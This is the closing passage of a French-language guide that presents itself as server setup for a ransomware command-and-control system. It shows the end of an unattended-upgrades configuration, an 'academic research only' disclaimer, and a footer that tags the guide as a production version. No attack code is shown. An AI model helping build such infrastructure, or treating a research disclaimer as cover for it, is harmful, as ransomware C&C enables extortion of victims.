    "${distro_id}ESMApps:${distro_codename}-apps-security";
};

Unattended-Upgrade::Package-Blacklist {
    "nginx";      // Avoid breaking configuration
    "php*";       // Avoid PHP version changes
};

Unattended-Upgrade::AutoFixInterruptedDpkg "true";
Unattended-Upgrade::MinimalSteps "true";
Unattended-Upgrade::Remove-Unused-Dependencies "true";
Unattended-Upgrade::Automatic-Reboot "false";

// Email notifications
Unattended-Upgrade::Mail "admin@example.com";
Unattended-Upgrade::MailReport "on-change";
EOF

systemctl enable unattended-upgrades
```

---

## ⚠️ CONSIDÉRATIONS LÉGALES ET ÉTHIQUES

### **Notice Importante**

```
🚨 AVERTISSEMENT CRITIQUE 🚨

Cette documentation décrit l'infrastructure technique d'un système 
de Command & Control (C&C) pour ransomware à des fins de RECHERCHE 
ACADÉMIQUE UNIQUEMENT.

❌ UTILISATIONS INTERDITES:
- Déploiement en environnement de production
- Attaques sur systèmes non autorisés  
- Distribution de malware réel
- Activités cybercriminelles

✅ UTILISATIONS AUTORISÉES:
- Recherche académique en cybersécurité
- Développement de solutions de défense
- Formation sécurité informatique contrôlée
- Tests dans environnements isolés autorisés

🔬 CADRE DE RECHERCHE:
Cette infrastructure doit uniquement être utilisée dans un 
contexte de recherche contrôlé, autorisé et éthique, avec 
l'approbation des autorités compétentes et dans le respect 
des lois locales et internationales.

⚖️ RESPONSABILITÉ:
L'utilisateur est entièrement responsable de l'usage fait 
de ces informations et doit s'assurer de la conformité avec 
toutes les réglementations applicables.
```

---

*Guide de Configuration C&C généré par BYJY-RwGen Analysis System*  
*Version: 2024.Q2.PRODUCTION*  
*Classification: ACADEMIC RESEARCH ONLY*